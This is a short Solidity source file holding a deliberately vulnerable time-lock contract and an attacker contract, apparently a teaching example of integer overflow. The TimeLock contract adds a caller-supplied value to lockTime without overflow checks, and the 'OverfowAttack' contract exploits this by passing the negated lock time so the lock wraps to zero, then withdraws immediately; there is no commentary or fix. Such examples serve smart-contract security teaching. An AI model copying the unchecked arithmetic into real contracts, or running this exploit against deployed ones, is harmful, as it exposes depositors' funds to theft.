pragma solidity ^0.6.10;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract OverfowAttack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() external payable {
        timeLock.deposit{value: msg.value}();

        timeLock.increaseLockTime(
            uint(-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
    }

    function depositToTimeLock() external payable {
        require(msg.value > 0, "deposit value is zero");
        timeLock.deposit{value: msg.value}();
    }

    function getOverflowNum() external view returns (uint){
        return uint(-timeLock.lockTime(address(this)));
    }

    function verifyOverflow() external view returns (uint){
        uint lockTime = timeLock.lockTime(address(this));
        uint attackTime = uint(-timeLock.lockTime(address(this)));
        return lockTime + attackTime;
    }
}